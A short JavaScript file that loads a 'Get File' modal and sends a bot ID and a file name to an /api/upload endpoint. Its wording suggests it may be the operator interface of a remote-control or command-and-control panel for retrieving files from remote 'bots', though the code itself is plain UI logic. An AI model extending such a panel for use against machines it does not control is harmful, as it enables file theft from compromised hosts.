// Dynamically load the "Get File" modal
async function loadUploadModal() {
    const response = await fetch('/static/html/partial.upload-modal.html'); // Fetch the modal HTML snippet
    if (response.ok) {
        const modalHtml = await response.text();
        document.getElementById('modal-section').innerHTML = modalHtml; // Inject the modal into the DOM

        // Initialize modal-related JavaScript after loading
        initializeUploadModal();
    } else {
        console.error('Failed to load upload modal:', response.status);
    }
}

function initializeUploadModal() {
    const modal = document.getElementById('upload-modal');
    const openModalButton = document.getElementById('open-upload-modal');
    const closeButton = modal.querySelector('.close-button');
    const uploadForm = document.getElementById('upload-form');
    const fileNameInput = document.getElementById('file-name-input');

    // Open the modal when the "Get File" button is clicked
    openModalButton.addEventListener('click', () => {
        modal.style.display = 'block';
    });

    // Close the modal when the close button is clicked
    closeButton.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    // Close the modal when clicking outside of it
    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Handle the form submission
    uploadForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        const botId = document.getElementById('client-id').value; // Hidden input for bot ID
        const fileName = fileNameInput.value.trim();

        if (!botId) {
            alert("Bot ID is missing.");
            return;
        }

        if (!fileName) {
            alert("Please enter a file name.");
            return;
        }

        try {
            const response = await fetch('/api/upload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `bot_id=${encodeURIComponent(botId)}&file_name=${encodeURIComponent(fileName)}`,
            });

            if (response.ok) {
                alert("File request sent successfully!");
            } else {
                const error = await response.json();
                alert(`Error: ${error.error}`);
            }
        } catch (error) {
            console.error("Error sending file request:", error);
            alert("Failed to send file request.");
        }

        // Close the modal
        modal.style.display = 'none';
    });
}

// Call the function to load the upload modal
loadUploadModal();